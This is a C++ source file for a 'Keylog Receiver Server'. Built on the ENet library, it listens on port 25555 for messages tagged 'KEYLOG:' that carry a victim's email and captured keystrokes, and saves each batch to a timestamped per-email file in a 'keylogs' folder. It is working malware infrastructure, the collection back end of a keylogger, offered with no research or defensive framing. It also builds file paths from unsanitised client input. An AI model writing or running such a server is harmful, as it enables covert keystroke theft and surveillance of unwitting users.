#include <enet/enet.h>
#include <iostream>
#include <string>
#include <fstream>
#include <filesystem>
#include <map>
#include <thread>
#include <mutex>
#include <ctime>

using namespace std;
namespace fs = std::filesystem;

// Mutex for synchronized file access
std::mutex fileMutex;

// Function to get current timestamp for logging
string getCurrentTimestamp() {
    time_t now = time(nullptr);
    char buffer[80];
    struct tm timeInfo;
    localtime_s(&timeInfo, &now);
    strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", &timeInfo);
    return string(buffer);
}

// Function to extract email from the message
string extractEmail(const string& message) {
    // Find the start of email (after "Email:")
    size_t emailStart = message.find("Email:") + 6;
    if (emailStart == string::npos + 6) return "unknown";
    
    // Find the end of email (before "|KeylogData:")
    size_t emailEnd = message.find("|KeylogData:", emailStart);
    if (emailEnd == string::npos) return "unknown";
    
    return message.substr(emailStart, emailEnd - emailStart);
}

// Function to extract keylog data from the message
string extractKeylogData(const string& message) {
    // Find the start of keylog data (after "|KeylogData: ")
    size_t dataStart = message.find("|KeylogData: ") + 13;
    if (dataStart == string::npos + 13) return "";
    
    return message.substr(dataStart);
}

// Function to save keylog data to file
void saveKeylogData(const string& email, const string& data) {
    // Create a filename based on the email
    string filename = email + ".txt";
    
    // Make sure directory exists
    if (!fs::exists("keylogs")) {
        fs::create_directory("keylogs");
    }
    
    // Lock for thread safety when writing to file
    std::lock_guard<std::mutex> guard(fileMutex);
    
    // Open file for appending
    ofstream outFile("keylogs/" + filename, ios::app);
    if (!outFile.is_open()) {
        cerr << "Failed to open file: " << filename << endl;
        return;
    }
    
    // Write data with timestamp
    outFile << "======== " << getCurrentTimestamp() << " ========" << endl;
    outFile << data << endl;
    outFile << "====================================" << endl << endl;
    
    outFile.close();
    
    cout << "Keylog data saved for " << email << endl;
}

// Main server function
int main() {
    cout << "=== Keylog Receiver Server ===" << endl;
    cout << "Starting server on port 25555..." << endl;
    
    // Initialize ENet
    if (enet_initialize() != 0) {
        cerr << "Failed to initialize ENet!" << endl;
        return EXIT_FAILURE;
    }
    
    atexit(enet_deinitialize);  // Clean up ENet when program exits
    
    // Create the server address structure
    ENetAddress address;
    address.host = ENET_HOST_ANY;  // Listen on any interface
    address.port = 25555;          // Use a different port than main server
    
    // Create the server host
    ENetHost* server = enet_host_create(
        &address,   // Bind to the address we configured
        32,         // Allow up to 32 clients
        2,          // Support 2 channels
        0, 0        // No bandwidth limits
    );
    
    if (!server) {
        cerr << "Failed to create ENet server host!" << endl;
        return EXIT_FAILURE;
    }
    
    cout << "Server started successfully. Waiting for connections..." << endl;
    
    // Create logs directory if it doesn't exist
    if (!fs::exists("keylogs")) {
        fs::create_directory("keylogs");
    }
    
    // Main server loop
    while (true) {
        ENetEvent event;
        
        // Wait for events (with 10s timeout)
        while (enet_host_service(server, &event, 10000) > 0) {
            switch (event.type) {
                case ENET_EVENT_TYPE_CONNECT:
                    cout << "Client connected from " 
                         << event.peer->address.host << ":" << event.peer->address.port << endl;
                    break;
                    
                case ENET_EVENT_TYPE_RECEIVE:
                    {
                        // Get the message as a string
                        string message(reinterpret_cast<char*>(event.packet->data));
                        
                        // Check if this is a keylog message
                        if (message.find("KEYLOG:") == 0) {
                            // Extract the real message content (after "KEYLOG:")
                            string content = message.substr(7);
                            
                            // Extract email and keylog data
                            string email = extractEmail(content);
                            string keylogData = extractKeylogData(content);
                            
                            // Save the data to a file
                            if (!email.empty() && !keylogData.empty()) {
                                saveKeylogData(email, keylogData);
                                
                                // Send confirmation back
                                string confirmation = "Keylog data received and saved.";
                                ENetPacket* packet = enet_packet_create(
                                    confirmation.c_str(),
                                    confirmation.size() + 1,
                                    ENET_PACKET_FLAG_RELIABLE
                                );
                                enet_peer_send(event.peer, 0, packet);
                            }
                        }
                        
                        // Clean up the packet
                        enet_packet_destroy(event.packet);
                    }
                    break;
                    
                case ENET_EVENT_TYPE_DISCONNECT:
                    cout << "Client disconnected." << endl;
                    event.peer->data = nullptr;
                    break;
                    
                case ENET_EVENT_TYPE_NONE:
                    break;
            }
        }
    }
    
    // Clean up (though we never reach this in this simple example)
    enet_host_destroy(server);
    
    return 0;
}